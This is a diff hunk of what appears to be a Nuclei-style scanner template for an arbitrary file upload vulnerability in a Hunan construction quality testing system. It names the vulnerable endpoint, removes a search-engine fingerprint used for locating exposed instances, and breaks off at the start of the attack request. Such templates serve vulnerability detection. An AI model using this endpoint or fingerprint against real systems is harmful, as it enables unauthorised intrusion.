@@ -3,14 +3,8 @@ info:
   name: 湖南建研工程质量检测系统updatefile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f4e1236917b4c334ec30cd69a9bc1288
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: f4e1236917b4c334ec30cd69a9bc1288
-    fofa: + hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
 http:
 - raw:
   - 'POST /Scripts/admintool?type=updatefile HTTP/1.1
